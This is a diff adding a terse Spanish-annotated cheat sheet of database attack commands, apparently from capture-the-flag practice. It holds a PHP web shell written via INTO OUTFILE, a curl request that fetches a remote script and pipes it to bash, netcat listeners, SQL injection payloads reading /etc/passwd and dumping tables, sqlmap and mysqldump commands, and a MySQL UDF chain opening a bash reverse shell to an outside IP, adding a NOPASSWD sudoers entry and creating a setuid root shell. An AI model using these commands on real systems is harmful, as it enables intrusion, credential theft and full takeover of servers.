@@ -1,0 +1,53 @@
+# con acceso a una BD podemos insertar codigo PHP para ganar RCE
+mysql>select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+
+curl 192.168.100.1:8080/shell.php?cmd=whoami
+curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.155.7%3A8000%2Fshell.sh%7Cbash%20%26'
+
+A> sudo rlwrap nc -lvnp 53
+A> python3 -m http.server 8000
+
+# sqlite
+1'-- -
+admin'-- -
+and 1 = 1
+and 2 = 1 union select 1,2,3
+
+order by 100;
+
+union select 1,2,3,4;
+union select 1,2,3,database();
+union select 1,2,3,user();
+union select 1,2,3,load_file('/etc/passwd');
+union select schema_name,2,3,4 from information_schema.schemata; **muestra todas las db**
+
+union select schema_name,2,3,4 from information_schema.schemata limit 1,1; **para forzar que muestre las db**
+union select 1,2,table_name,4 from information_schema.tables where table_schema = 'sqhell_5'; **tablas**
+union select 1,2,column_name,4 from information_schema.columns where table_schema = 'sqhell_5' and table_name = 'flag'; **columnas**
+union select 1,2,id,4 from sqhell_5.flag; **muestra el contenido de la tabla sqhell_5 la columna flag**
+union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag;
+
+mysql -u USER -p PASS -P CMD
+mysqlshow -u USER -p PASS DATABASE TABLES
+mysqldump -u USER --password=PASS --single-transaction --all-databases
+mysqldump -u USER --password=PASS --no-data TABLES
+mysqldump -u root -p Password123! --all-databases > all_db_backup.sql
+
+sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
+sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump
+
+# mysql (UDFs exploit):
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+mysql -u root
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+
+select do_system('bash -i >& /dev/tcp/10.8.23.159/9001 0>&1'); #bash rev shell
+select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers'); # modificando /etc/sudoers
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+/tmp/rootbash -p # root shell
